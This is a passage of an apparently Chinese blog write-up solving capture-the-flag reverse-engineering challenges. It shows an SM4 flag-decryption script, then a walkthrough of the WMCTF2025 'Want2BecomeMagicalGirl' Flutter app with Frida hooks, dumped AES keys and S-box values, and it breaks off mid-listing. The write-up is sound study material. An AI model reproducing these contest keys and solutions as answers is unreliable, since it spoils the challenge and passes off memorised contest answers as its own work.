<span class="number">0x81</span>, <span class="number">0xb2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xda</span>, <span class="number">0x8b</span>, <span class="number">0xf8</span>, <span class="number">0xeb</span>, <span class="number">0x0f</span>, <span class="number">0x4b</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9d</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0x0e</span>, <span class="number">0x5e</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xd1</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xd4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9f</span>, <span class="number">0xd3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4c</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xe7</span>, <span class="number">0xa0</span>, <span class="number">0xc4</span>, <span class="number">0xc8</span>, <span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xea</span>, <span class="number">0xbf</span>, <span class="number">0x8a</span>, <span class="number">0xd2</span>, <span class="number">0x40</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xb5</span>, <span class="number">0xa3</span>, <span class="number">0xf7</span>, <span class="number">0xf2</span>, <span class="number">0xce</span>, <span class="number">0xf9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0xe0</span>, <span class="number">0xae</span>, <span class="number">0x5d</span>, <span class="number">0xa4</span>, <span class="number">0x9b</span>, <span class="number">0x34</span>, <span class="number">0x1a</span>, <span class="number">0x55</span>, <span class="number">0xad</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xf5</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0xe3</span>,</span><br><span class="line">    <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0xe2</span>, <span class="number">0x2e</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xca</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xab</span>, <span class="number">0x0d</span>, <span class="number">0x53</span>, <span class="number">0x4e</span>, <span class="number">0x6f</span>,</span><br><span class="line">    <span class="number">0xd5</span>, <span class="number">0xdb</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xde</span>, <span class="number">0xfd</span>, <span class="number">0x8e</span>, <span class="number">0x2f</span>, <span class="number">0x03</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x72</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x5b</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8d</span>, <span class="number">0x1b</span>, <span class="number">0xaf</span>, <span class="number">0x92</span>, <span class="number">0xbb</span>, <span class="number">0xdd</span>, <span class="number">0xbc</span>, <span class="number">0x7f</span>, <span class="number">0x11</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x1f</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0xd8</span>,</span><br><span class="line">    <span class="number">0x0a</span>, <span class="number">0xc1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xa5</span>, <span class="number">0xcd</span>, <span class="number">0x7b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x74</span>, <span class="number">0xd0</span>, <span class="number">0x12</span>, <span class="number">0xb8</span>, <span class="number">0xe5</span>, <span class="number">0xb4</span>, <span class="number">0xb0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4a</span>, <span class="number">0x0c</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7e</span>, <span class="number">0x65</span>, <span class="number">0xb9</span>, <span class="number">0xf1</span>, <span class="number">0x09</span>, <span class="number">0xc5</span>, <span class="number">0x6e</span>, <span class="number">0xc6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xf0</span>, <span class="number">0x7d</span>, <span class="number">0xec</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x4d</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xee</span>, <span class="number">0x5f</span>, <span class="number">0x3e</span>, <span class="number">0xd7</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>, <span class="number">0x48</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">CK = [</span><br><span class="line">    <span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>, <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">    <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>, <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">    <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>, <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">    <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>, <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">FK = [<span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span>]</span><br><span class="line">KEY = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;0123456789abcdeffedcba9876543210&quot;</span>)</span><br><span class="line">EXPECTED = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">&quot;dbe98e0ad47ed658741cd38ef8595985&quot;</span></span><br><span class="line">    <span class="string">&quot;8177d9f3a8f90f24cfe14fd11a313b72&quot;</span></span><br><span class="line">    <span class="string">&quot;002a8a4efa863ccad024ac0300bb40d2&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotl32</span>(<span class="params">x: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; n) &amp; <span class="number">0xFFFFFFFF</span>) | (x &gt;&gt; (<span class="number">32</span> - n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tau</span>(<span class="params">word: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">            (SBOX[(word &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line">            | (SBOX[(word &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">16</span>)</span><br><span class="line">            | (SBOX[(word &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">8</span>)</span><br><span class="line">            | SBOX[word &amp; <span class="number">0xFF</span>]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T_key</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    t = tau(x)</span><br><span class="line">    <span class="keyword">return</span> t ^ rotl32(t, <span class="number">13</span>) ^ rotl32(t, <span class="number">23</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T_round</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    t = tau(x)</span><br><span class="line">    <span class="keyword">return</span> t ^ rotl32(t, <span class="number">2</span>) ^ rotl32(t, <span class="number">10</span>) ^ rotl32(t, <span class="number">18</span>) ^ rotl32(t, <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expand_rk</span>(<span class="params">key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    MK = [<span class="built_in">int</span>.from_bytes(key[i:i + <span class="number">4</span>], <span class="string">&quot;big&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)]</span><br><span class="line">    K = [MK[i] ^ FK[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        x = K[i + <span class="number">1</span>] ^ K[i + <span class="number">2</span>] ^ K[i + <span class="number">3</span>] ^ CK[i]</span><br><span class="line">        K.append(K[i] ^ T_key(x))</span><br><span class="line">    <span class="keyword">return</span> K[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_ecb_decrypt</span>(<span class="params">cipher: <span class="built_in">bytes</span>, rk: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    rk_dec = rk[::-<span class="number">1</span>]</span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> block_offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">16</span>):</span><br><span class="line">        block = cipher[block_offset:block_offset + <span class="number">16</span>]</span><br><span class="line">        X = [<span class="built_in">int</span>.from_bytes(block[i:i + <span class="number">4</span>], <span class="string">&quot;big&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)]</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            x = X[r + <span class="number">1</span>] ^ X[r + <span class="number">2</span>] ^ X[r + <span class="number">3</span>] ^ rk_dec[r]</span><br><span class="line">            X.append(X[r] ^ T_round(x))</span><br><span class="line">        words = X[-<span class="number">4</span>:][::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> w <span class="keyword">in</span> words:</span><br><span class="line">            out.extend(w.to_bytes(<span class="number">4</span>, <span class="string">&quot;big&quot;</span>))</span><br><span class="line">    pad = out[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">1</span> &lt;= pad &lt;= <span class="number">16</span> <span class="keyword">or</span> out[-pad:] != <span class="built_in">bytes</span>([pad]) * pad:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid PKCS#7 padding&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out[:-pad])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    round_keys = expand_rk(KEY)</span><br><span class="line">    flag = sm4_ecb_decrypt(EXPECTED, round_keys)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h2 id="Want2BecomeMagicalGirl-复现"><a href="#Want2BecomeMagicalGirl-复现" class="headerlink" title="Want2BecomeMagicalGirl[复现]"></a>Want2BecomeMagicalGirl[复现]</h2><p><a href="https://www.fxmx2.top/posts/ctf/wmctf2025-want2becomemagicalgirl/">WMCTF2025 Want2BecomeMagicalGirl - Britney</a></p><p>我原以为逻辑是这样的(通过blutter<strong>看到的</strong>)：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250925191431009.png" alt="image-20250925191431009"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250925191519986.png" alt="image-20250925191519986"></p><p><code>check</code> 里：</p><ol><li>初始化 <code>AesCrypt</code>，从 <code>native_add</code> 获取一些 <strong>native 值</strong>（<code>getSym</code>、<code>getKey</code>），组装 <strong>Key&#x2F;IV</strong>；</li><li>根据文本长度补齐到 16 字节块（自定义 padding），UTF-8 编码；</li><li>设定 AES 的 keys &amp; mode，执行 <code>aesEncrypt</code>；</li><li>把密文 <code>Uint8List</code> 转十六进制字符串（<code>uint8ListToHex</code>），再 <code>send()</code>；</li><li>拿到 <code>send()</code> 的返回字符串后（通过 <code>.then(...)</code>），再 <code>setState</code>：如果返回值等于一段硬编码字符串（<code>&quot;8sAFX45zT7u...&quot;</code>），显示成功文案“<strong>You have become a magical girl !!<strong>”，否则显示“</strong>This spell has no magic power</strong>”。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8sAFX45zT7uc0vSUyFNNly1h/d5zTt89tV3kcVr5P5n7lRKPyYtxg31zYNB2lPV0c5nf/x2/IK94XV9Ufs9XfaDG5IXxMlZy+Z2nE+ZZRFBSpMoKzQXfUq2TSjJJfQxV</span><br></pre></td></tr></table></figure><p><a href="https://cyberchef.io/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt({'option':'Hex','string':'7a25c524c6334c30f362afac00000000'},{'option':'Hex','string':'020406080A0C0E10121416181A1C1E20'},'CBC','Raw','Raw',{'option':'Hex','string':''},{'option':'Hex','string':''})&input=OHNBRlg0NXpUN3VjMHZTVXlGTk5seTFoL2Q1elR0ODl0VjNrY1ZyNVA1bjdsUktQeVl0eGczMXpZTkIybFBWMGM1bmYveDIvSUs5NFhWOVVmczlYZmFERzVJWHhNbFp5K1oybkUrWlpSRkJTcE1vS3pRWGZVcTJUU2pKSmZReFY">From Base64, AES Decrypt - CyberChef</a></p><p>发现解出来是乱码</p><p>出题人给了提示init_array，猜到是做了修改，但是安卓还是不太熟</p><p>前端有部分xxtea</p><p>密文前端，还有加密逻辑都有了，可以得知是一个aes–&gt;xxtea(中间可能还有rc4生成key)–&gt;base64返回与那一串密文校验</p><p>剩下的就是其他操作了，看了wp</p><p><a href="https://www.fxmx2.top/posts/ctf/wmctf2025-want2becomemagicalgirl/#1%E5%88%86%E6%9E%90">WMCTF2025 Want2BecomeMagicalGirl - Britney</a></p><p>复现下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall magical_girl_aes_crypt_null_safe__Aes::_mixColumns_28d8b0(__int64 a1, __int64 a2)</span><br></pre></td></tr></table></figure><p>发现一大串疑似sbox的东西</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250925194329359.png" alt="image-20250925194329359"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250925194538093.png" alt="image-20250925194538093"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250925194606638.png" alt="image-20250925194606638"></p><p>其中这些函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__int64 magical_girl_EditView_MyEditTextState::check_28bea8()</span><br></pre></td></tr></table></figure><p>最重要</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250925195223779.png" alt="image-20250925195223779"></p><p>包括setkey和mode</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250925195246855.png" alt="image-20250925195246855"></p><p>加密的数据通过 <code>aesEncrypt_28c6a8</code> 和其他相关函数进行处理，这表明该函数处理的是加密或解密任务。</p><blockquote><p>显然这里肯定会传一个类似实例的东西，借助blutter自带的frida脚本</p></blockquote><p>给了一个blutter_frida.js hook脚本</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250925200045853.png" alt="image-20250925200045853"></p><p>hook试试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onLibappLoaded</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> fn_addr = <span class="number">0x28c6a8</span>;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(libapp.<span class="title function_">add</span>(fn_addr), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title function_">init</span>(<span class="variable language_">this</span>.<span class="property">context</span>);</span><br><span class="line">            <span class="keyword">let</span> objPtr = <span class="title function_">getArg</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">const</span> [tptr, cls, values] = <span class="title function_">getTaggedObjectValue</span>(objPtr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">                <span class="string">`<span class="subst">$&#123;cls.name&#125;</span>@<span class="subst">$&#123;tptr.toString().slice(<span class="number">2</span>)&#125;</span> =`</span>,</span><br><span class="line">                <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(values, <span class="literal">null</span>, <span class="number">2</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者hook这个</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251019195744279.png" alt="image-20251019195744279"></p><blockquote><p>getArg(this.context, 0) 更改第二个参数控制传参打印位置</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onLibappLoaded</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> fn_addr = <span class="number">0x2915a4</span>;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(libapp.<span class="title function_">add</span>(fn_addr), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title function_">init</span>(<span class="variable language_">this</span>.<span class="property">context</span>);</span><br><span class="line">            <span class="keyword">let</span> objPtr = <span class="title function_">getArg</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">const</span> [tptr, cls, values] = <span class="title function_">getTaggedObjectValue</span>(objPtr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;cls.name&#125;</span>@<span class="subst">$&#123;tptr.toString().slice(<span class="number">2</span>)&#125;</span> =`</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(values, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251019200651511.png" alt="image-20251019200651511"></p><p>hook得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">AesCrypt@6f00854529 = &#123;</span><br><span class="line">  &quot;off_8!_Aes@6f00854539&quot;: &#123;</span><br><span class="line">    &quot;off_8!Smi&quot;: 4,</span><br><span class="line">    &quot;off_c!Smi&quot;: 10,</span><br><span class="line">    &quot;off_10!_Uint32List@6f00854f49&quot;: [</span><br><span class="line">      2049295652,</span><br><span class="line">      3325250608,</span><br><span class="line">      4083330988,</span><br><span class="line">      16843781,</span><br><span class="line">      6783327,</span><br><span class="line">      3327446383,</span><br><span class="line">      892756675,</span><br><span class="line">      876046022,</span><br><span class="line">      3267769349,</span><br><span class="line">      76740970,</span><br><span class="line">      832871337,</span><br><span class="line">      93584751,</span><br><span class="line">      2526363713,</span><br><span class="line">      2449979691,</span><br><span class="line">      2745377410,</span><br><span class="line">      2788220909,</span><br><span class="line">      3825754614,</span><br><span class="line">      1980750045,</span><br><span class="line">      3584883295,</span><br><span class="line">      1939613106,</span><br><span class="line">      2595761419,</span><br><span class="line">      3971478998,</span><br><span class="line">      958074761,</span><br><span class="line">      1250372155,</span><br><span class="line">      576656933,</span><br><span class="line">      3471369203,</span><br><span class="line">      4159958138,</span><br><span class="line">      3178546753,</span><br><span class="line">      3672808602,</span><br><span class="line">      335708009,</span><br><span class="line">      3824259859,</span><br><span class="line">      1585796434,</span><br><span class="line">      1333110389,</span><br><span class="line">      1534581020,</span><br><span class="line">      3095808527,</span><br><span class="line">      3858964317,</span><br><span class="line">      4090255858,</span><br><span class="line">      2830860526,</span><br><span class="line">      272485089,</span><br><span class="line">      4131313084,</span><br><span class="line">      1712018262,</span><br><span class="line">      3467695032,</span><br><span class="line">      3733789017,</span><br><span class="line">      682872037</span><br><span class="line">    ],</span><br><span class="line">    &quot;off_14!List@6f00854569&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: [</span><br><span class="line">          0,</span><br><span class="line">          0,</span><br><span class="line">          0,</span><br><span class="line">          0</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: [</span><br><span class="line">          0,</span><br><span class="line">          0,</span><br><span class="line">          0,</span><br><span class="line">          0</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: [</span><br><span class="line">          0,</span><br><span class="line">          0,</span><br><span class="line">          0,</span><br><span class="line">          0</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: [</span><br><span class="line">          0,</span><br><span class="line">          0,</span><br><span class="line">          0,</span><br><span class="line">          0</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;off_18!AesMode@6f0045a1b1&quot;: &#123;</span><br><span class="line">      &quot;parent!_Enum&quot;: &#123;</span><br><span class="line">        &quot;off_8&quot;: &quot;0&quot;,</span><br><span class="line">        &quot;off_10!String@6f000f7a61&quot;: &quot;ecb&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;off_1c!_Uint8List@6f00854ee9&quot;: [</span><br><span class="line">      122,</span><br><span class="line">      37,</span><br><span class="line">      197,</span><br><span class="line">      36,</span><br><span class="line">      198,</span><br><span class="line">      51,</span><br><span class="line">      76,</span><br><span class="line">      48,</span><br><span class="line">      243,</span><br><span class="line">      98,</span><br><span class="line">      175,</span><br><span class="line">      172,</span><br><span class="line">      1,</span><br><span class="line">      1,</span><br><span class="line">      4,</span><br><span class="line">      5</span><br><span class="line">    ],</span><br><span class="line">    &quot;off_20!_Uint8List@6f00854f19&quot;: [</span><br><span class="line">      1,</span><br><span class="line">      2,</span><br><span class="line">      3,</span><br><span class="line">      4,</span><br><span class="line">      5,</span><br><span class="line">      6,</span><br><span class="line">      7,</span><br><span class="line">      8,</span><br><span class="line">      9,</span><br><span class="line">      10,</span><br><span class="line">      11,</span><br><span class="line">      12,</span><br><span class="line">      13,</span><br><span class="line">      14,</span><br><span class="line">      15,</span><br><span class="line">      16</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;off_c!Map@6f00854719&quot;: &quot;Unhandle class id: 85, Map&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>aesEncrypt_28c6a8</code> 都第一个参数是输入的flag</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251019200938343.png" alt="image-20251019200938343"></p></blockquote><p>16字节的那个有点像key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f work.pangbai.magic.magical_girl -l blutter_frida.js</span><br></pre></td></tr></table></figure><p>反正现在S盒子S盒逆key ecb都有了可以写代码解密了</p><p>sbox 我们将这些值均除以2</p><blockquote><p>flutter的整数貌似都是*2存储的</p></blockquote><p>发现还改了一下addroundkey和mixClou</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251008214555519.png" alt="image-20251008214555519"></p><blockquote><p>Flutter 函数调用约定: 参数从右往左入栈，最后入栈对象的this指针</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 